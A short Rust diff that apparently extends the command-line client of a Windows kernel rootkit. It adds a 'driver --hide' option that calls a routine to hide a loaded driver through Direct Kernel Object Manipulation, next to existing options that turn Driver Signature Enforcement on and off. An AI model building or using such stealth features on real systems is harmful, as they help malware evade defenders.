@@ -16,6 +16,7 @@ enum Commands {
    Process(Process),
    Callbacks(Callbacks),
    DSE(DSE),
+   Driver(Driver),
 }
 
 #[derive(Args)]
@@ -78,6 +79,18 @@ struct DSE {
     disable: bool,
 }
 
+#[derive(Args)]
+#[clap(group(
+    ArgGroup::new("driver")
+        .required(true)
+        .args(&["hide"]),
+))]
+struct Driver {
+    /// Hide a driver using Direct Kernel Object Manipulation (DKOM)
+    #[clap(long)]
+    hide: bool,
+}
+
 fn main() {
 
     let cli = Cli::parse();
@@ -128,6 +141,13 @@ fn main() {
                 kernel_interface::enable_or_disable_dse(driver_handle, true);
             } else if d.disable {
                 kernel_interface::enable_or_disable_dse(driver_handle, false);
+            } else {
+                println!("[-] Invalid arguments");
+            }
+        }
+        Commands::Driver(d) => {
+            if d.hide {
+                kernel_interface::hide_driver(driver_handle);
             } else {
                 println!("[-] Invalid arguments");
             }
